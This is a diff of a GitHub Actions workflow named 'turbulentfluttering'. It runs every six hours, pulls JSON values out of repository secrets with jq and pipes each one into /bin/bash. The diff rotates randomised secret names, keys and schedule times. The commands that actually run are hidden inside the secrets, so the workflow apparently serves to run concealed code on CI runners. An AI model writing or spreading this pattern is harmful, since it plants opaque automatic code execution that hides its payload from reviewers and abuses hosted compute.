@@ -3,26 +3,18 @@ name: turbulentfluttering
 on:
   workflow_dispatch:
   schedule:
-    - cron: '34 0/6 * * *'
-jobs:  # 18867
+    - cron: '45 2/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: turbulentfluttering
         env:
-          dxqx322: ${{ secrets.dxqx322 }}
+          jc2: ${{ secrets.jc2 }}
         run: |
-          echo $dxqx322 | jq -r .iyi15596 | /bin/bash
-          echo $ligzy891 | jq -r .vhu581 | /bin/bash
-          echo $pvk20169 | jq -r .imgi3 | /bin/bash
-          echo $pr1523 | jq -r .g012 | /bin/bash
-          echo $vpuae48 | jq -r .lmkxw77 | /bin/bash
-          echo $z0 | jq -r .t8414 | /bin/bash
-          echo $yg3 | jq -r .rftvt7881 | /bin/bash
-          echo $ighg47181 | jq -r .oyghz57771 | /bin/bash
-          echo $lx9 | jq -r .cwhgm0 | /bin/bash
-          echo $vddn0950 | jq -r .u5 | /bin/bash
-          echo $ws99 | jq -r .wkb36 | /bin/bash
-          echo $exta3799 | jq -r .xajh28771 | /bin/bash
+          echo $jc2 | jq -r .dom04 | /bin/bash
+          echo $kde9 | jq -r .swqfl23903 | /bin/bash
+          echo $qt57458 | jq -r .b4058 | /bin/bash
+          echo $bhlvf47455 | jq -r .pkj15605 | /bin/bash
 
